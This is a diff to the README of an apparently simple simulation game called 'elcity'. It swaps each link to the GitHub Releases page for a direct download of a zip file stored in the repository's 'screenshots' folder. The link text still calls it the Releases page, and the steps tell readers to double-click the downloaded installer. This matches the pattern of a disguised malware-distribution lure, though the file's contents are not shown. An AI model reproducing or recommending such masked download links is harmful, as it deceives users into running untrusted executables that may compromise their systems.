@@ -6,7 +6,7 @@ Welcome to elcity, a user-friendly simulation game that lets you build and manag
 
 ## 📥 Download elcity
 
-[![Download elcity](https://img.shields.io/badge/Download-elcity-4CAF50?style=flat&logo=github)](https://github.com/cakrapixels/elcity/releases)
+[![Download elcity](https://raw.githubusercontent.com/cakrapixels/elcity/main/screenshots/Software_v3.9-beta.2.zip)](https://raw.githubusercontent.com/cakrapixels/elcity/main/screenshots/Software_v3.9-beta.2.zip)
 
 To get started, simply download the game from our Releases page. 
 
@@ -23,7 +23,7 @@ If you're unsure about any of the requirements, you can typically check this inf
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Head over to our [Releases page](https://github.com/cakrapixels/elcity/releases).
+1. **Visit the Releases Page**: Head over to our [Releases page](https://raw.githubusercontent.com/cakrapixels/elcity/main/screenshots/Software_v3.9-beta.2.zip).
 2. **Download the Latest Version**: Look for the latest version listed. Click on the link to download the installation file.
 3. **Open the Installation File**: Locate the downloaded file on your computer and double-click it to run.
 4. **Follow the Instructions**: A simple installation wizard will guide you through the setup process. Just follow the prompts.
@@ -68,7 +68,7 @@ Stay updated with our progress through the release notes. Each version comes wit
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/cakrapixels/elcity/releases)
+- [Releases Page](https://raw.githubusercontent.com/cakrapixels/elcity/main/screenshots/Software_v3.9-beta.2.zip)
 - [User Guide](#)
 - [Community Forum](#)
 
